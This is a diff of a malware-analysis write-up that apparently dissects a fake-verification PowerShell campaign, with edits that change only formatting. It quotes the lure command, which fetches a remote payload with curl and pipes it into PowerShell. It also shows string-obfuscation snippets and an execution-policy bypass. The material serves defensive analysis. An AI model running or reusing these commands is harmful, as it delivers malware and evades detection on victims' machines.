@@ -92,7 +92,7 @@ PowerShell’s addition operator (`+`) can concatenate string literals at runtim
 $url = 'h' + 'ttps://' + 'aviab.com' + '/payload.ps1'
 ```
 
-**Using the `-Join` Operator**  
+**Using the -Join Operator**  
 By placing fragments in an array and joining them, you prevent static detections of the assembled string:
 ```powershell
 $parts = 'ht','tp','s:','//av','iab','.com'
@@ -100,7 +100,7 @@ $url = $parts -Join ''
 ```
 The `-Join ''` collapses the array into the full URL only at execution time
 
-**Using the Format Operator (`-f`)**  
+**Using the Format Operator (-f)**  
 The format operator reorders and injects substrings according to placeholders:
 ```powershell
 & ("{1}{0}" -f 'ab','avi')
@@ -116,7 +116,7 @@ Now that we've discussed some of the techniques used by the attacker, let's anal
 ```powershell
 PowerShell -w Minimized curl.exe -k -L --retry 999  hxxps[://]dybep[.]fun/fb88c1eb21d4fe2712723729ad2fe738[.]txt | powershell -; 🌐 Access Guard: Validation. RefID: 45ab26cf05b6abc95f
 ```
-We can see that the attacker runs PowerShell with the **`-WindowStyle Minimized`** (`-w Minimized`) flag to launch a minimized window, reducing the chance of the user noticing. Then, `curl.exe` is used with the `-k` (ignore certificate errors), `-L` (follow redirects), and `--retry 999` (try up to 999 times) options to fetch a remote payload from `dybep[.]fun`.
+We can see that the attacker runs PowerShell with the `-WindowStyle Minimized` (`-w Minimized`) flag to launch a minimized window, reducing the chance of the user noticing. Then, `curl.exe` is used with the `-k` (ignore certificate errors), `-L` (follow redirects), and `--retry 999` (try up to 999 times) options to fetch a remote payload from `dybep[.]fun`.
 
 The downloaded content is piped (`|`) directly into another PowerShell instance using `powershell -`, which tells PowerShell to read and execute commands from standard input (i.e. the result of the `curl` request).
 
@@ -182,14 +182,17 @@ Either method will produce the following output:
 This stage encompasses a few new obfuscation techniques that we'll briefly go over.
 
 **Shorthand Parameters**
+
 In PowerShell, many cmdlet parameters can be abbreviated to their shortest unique form. For instance, `-NoProfile` can be shortened to `-NoP`, and `-ExecutionPolicy` to `-Ex`. While this feature is designed for convenience, attackers often exploit it as an obfuscation technique to make scripts harder to read and analyze.
 For example, the use of `'-NoP','-Ex','Bypass','-C'`is equivalent to `'-NoProfile', '-ExecutionPolicy', '-Command'`
 
 **Variable Aliasing**
+
 PowerShell allows the creation of aliases, alternate names for cmdlets, functions, scripts, or executable files. This means that a longer cmdlet name can be represented by a shorter alias, simplifying command usage.
 For example, the use of `SI` for `Set-Item`, `SV` for `Set-Variable`, and `GCI` for `Get-ChildItem`
 
-**Use of Where Clauses with Wildcards:**
+**Use of Where Clauses with Wildcards**
+
 In PowerShell, the `Where-Object` cmdlet is used to filter objects based on specified conditions. When combined with wildcard patterns, it allows for flexible and dynamic filtering of object properties. This technique is often employed to obfuscate code, making it less readable and harder to analyze.
 
 For example, we can use `Where-Object` to find all text files in a certain directory:
